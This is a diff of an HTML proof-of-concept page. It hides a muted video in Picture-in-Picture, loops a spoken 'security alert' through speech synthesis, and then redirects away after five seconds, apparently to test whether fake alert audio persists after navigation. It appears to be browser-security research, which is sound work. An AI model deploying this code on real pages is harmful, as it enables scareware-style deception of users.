@@ -3,27 +3,28 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP Audio → SpeechSynthesis PoC</title>
+<title>PiP + SpeechSynthesis + Redirect PoC</title>
 </head>
 <body>
 
-<h2>CLICK TO START AUDIO + TTS</h2>
+<h2>CLICK TO START</h2>
 <button id="startBtn">Start</button>
 
-<!-- Video untuk PiP tapi muted -->
+<!-- Video PiP muted -->
 <video id="v" src="windows.mp4" loop muted style="width:0; height:0;"></video>
 
 <script>
 const btn = document.getElementById('startBtn');
 const video = document.getElementById('v');
+let speaking = false;
 
 btn.addEventListener('click', async () => {
   btn.disabled = true;
 
-  // 🔊 Play video muted
-  try { await video.play(); } catch(e){}
+  // 🎬 Play video muted
+  try { await video.play(); } catch(e){ console.warn("Video play failed", e); }
 
-  // 🖼️ Request PiP (video muted, floating)
+  // 🖼️ Request PiP (muted)
   try {
     if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
       await video.requestPictureInPicture();
@@ -33,6 +34,9 @@ btn.addEventListener('click', async () => {
   // 🔊 SpeechSynthesis loop
   const text = "This is a security alert message from video.";
   function speakLoop() {
+    if (speaking) return;
+    speaking = true;
+
     const utter = new SpeechSynthesisUtterance(text);
     utter.lang = 'en-US';
 
@@ -43,10 +47,18 @@ btn.addEventListener('click', async () => {
     }
 
     speechSynthesis.speak(utter);
-    utter.onend = () => speakLoop();
+    utter.onend = () => {
+      speaking = false;
+      speakLoop(); // loop persistent
+    };
   }
 
   speakLoop();
+
+  // 🔀 Redirect setelah delay (user sempat dengar audio)
+  setTimeout(() => {
+    window.location.href = "https://www.google.com";
+  }, 5000); // delay 5 detik
 });
 </script>
 
